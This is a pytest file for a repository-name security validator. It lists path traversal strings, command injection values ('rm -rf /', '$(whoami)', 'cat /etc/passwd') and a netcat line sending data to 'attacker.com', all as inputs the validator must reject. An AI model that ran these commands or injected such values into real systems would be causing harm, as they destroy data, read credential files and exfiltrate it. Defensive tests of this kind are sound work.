"""
Tests for repository name validation security functionality
"""
import pytest
from app.utils.security import validate_repository_name


class TestRepositoryNameValidation:
    """Test repository name validation security"""

    def test_valid_repository_names(self):
        """Test that valid repository names pass validation"""
        valid_names = [
            "backup-repo",
            "MyRepository123",
            "simple_repo",
            "repo.backup",
            "test repo with spaces",
            "2023-backup-data",
            "user-home-backup",
            "a",  # single character
            "a" * 100,  # max length
        ]
        
        for name in valid_names:
            result = validate_repository_name(name)
            assert result == name, f"Valid name '{name}' should be accepted"

    def test_empty_or_none_names(self):
        """Test that empty or None names are rejected"""
        invalid_names = [
            None,
            "",
            "   ",  # whitespace only
            "\t\n",  # tabs and newlines only
        ]
        
        for name in invalid_names:
            with pytest.raises(ValueError, match="Repository name must be a non-empty string|cannot be empty"):
                validate_repository_name(name)

    def test_non_string_names(self):
        """Test that non-string types are rejected"""
        invalid_names = [
            123,
            ["list"],
            {"dict": "value"},
            True,
        ]
        
        for name in invalid_names:
            with pytest.raises(ValueError, match="Repository name must be a non-empty string"):
                validate_repository_name(name)

    def test_too_long_names(self):
        """Test that names exceeding maximum length are rejected"""
        long_name = "a" * 101  # 101 characters
        with pytest.raises(ValueError, match="Repository name too long"):
            validate_repository_name(long_name)

    def test_path_traversal_attacks(self):
        """Test that path traversal patterns are blocked"""
        dangerous_names = [
            "../etc/passwd",
            "..\\windows\\system32",
            "...//etc/shadow", 
            "repo../..",
            "repo/../admin",
            "...",  # Multiple dots
            "..",  # Directory traversal
            "../../../../../../etc/passwd",
        ]
        
        for name in dangerous_names:
            with pytest.raises(ValueError, match="contains invalid pattern"):
                validate_repository_name(name)

    def test_command_injection_patterns(self):
        """Test that command injection patterns are blocked"""
        dangerous_names = [
            "repo; rm -rf /",
            "repo | cat /etc/passwd",
            "repo & whoami",
            "repo > /tmp/hack",
            "repo < /etc/passwd",
            "repo `whoami`",
            "repo $(whoami)",
            "repo${IFS}command",
            "repo\nrm -rf /",
            "repo\r\nmalicious",
        ]
        
        for name in dangerous_names:
            with pytest.raises(ValueError, match="contains invalid pattern"):
                validate_repository_name(name)

    def test_names_starting_with_problematic_chars(self):
        """Test that names starting with dots, dashes, underscores, or spaces are blocked"""
        dangerous_names = [
            ".hidden-repo",
            "-dash-start",
            "_underscore_start",
            " space-start",
            "\ttab-start",
        ]
        
        for name in dangerous_names:
            with pytest.raises(ValueError, match="contains invalid pattern"):
                validate_repository_name(name)

    def test_names_ending_with_problematic_chars(self):
        """Test that names ending with dots, dashes, underscores, or spaces are blocked"""
        dangerous_names = [
            "repo-ending.",
            "repo-ending-",
            "repo-ending_",
            "repo-ending ",
            "repo-ending\t",
        ]
        
        for name in dangerous_names:
            with pytest.raises(ValueError, match="contains invalid pattern"):
                validate_repository_name(name)

    def test_reserved_windows_names(self):
        """Test that Windows reserved names are blocked"""
        reserved_names = [
            "CON",
            "PRN", 
            "AUX",
            "NUL",
            "COM1",
            "COM9",
            "LPT1",
            "LPT9",
            "con",  # case insensitive
            "prn",
            "aux",
            "nul",
        ]
        
        for name in reserved_names:
            with pytest.raises(ValueError, match="is a reserved system name"):
                validate_repository_name(name)

    def test_null_byte_removal(self):
        """Test that null bytes are removed from names"""
        name_with_null = "repo\x00name"
        result = validate_repository_name(name_with_null)
        assert result == "reponame"
        assert "\x00" not in result

    def test_boundary_conditions(self):
        """Test boundary conditions for name length"""
        # Exactly max length should work
        max_length_name = "a" * 100
        result = validate_repository_name(max_length_name)
        assert result == max_length_name
        
        # One character over should fail
        too_long_name = "a" * 101
        with pytest.raises(ValueError, match="Repository name too long"):
            validate_repository_name(too_long_name)

    def test_mixed_attack_patterns(self):
        """Test combinations of different attack patterns"""
        dangerous_names = [
            "../repo; rm -rf /",
            "repo$(cat /etc/passwd)../",
            ".hidden`whoami`repo",
            "_repo | nc attacker.com 9999",
            "repo\n../../../etc/shadow",
        ]
        
        for name in dangerous_names:
            with pytest.raises(ValueError, match="contains invalid pattern"):
                validate_repository_name(name)

    def test_unicode_and_special_chars(self):
        """Test that Unicode and special characters in valid ranges work"""
        # These should be allowed - normal characters
        valid_unicode_names = [
            "repo-français",
            "测试仓库",
            "репозиторий",
            "repo_с_символами",
            "🔒secure-repo",  # emoji
        ]
        
        for name in valid_unicode_names:
            try:
                result = validate_repository_name(name)
                # Should either work or fail cleanly, not crash
                assert isinstance(result, str)
            except ValueError:
                # It's ok if some Unicode is rejected, as long as it fails safely
                pass

    def test_edge_case_whitespace(self):
        """Test edge cases with whitespace"""
        # Internal whitespace should be OK
        name_with_spaces = "my backup repo"
        result = validate_repository_name(name_with_spaces)
        assert result == name_with_spaces
        
        # But leading/trailing whitespace chars should be rejected
        with pytest.raises(ValueError):
            validate_repository_name(" repo")
        with pytest.raises(ValueError):
            validate_repository_name("repo ")
        with pytest.raises(ValueError):
            validate_repository_name("\trepo")
        with pytest.raises(ValueError):
            validate_repository_name("repo\n")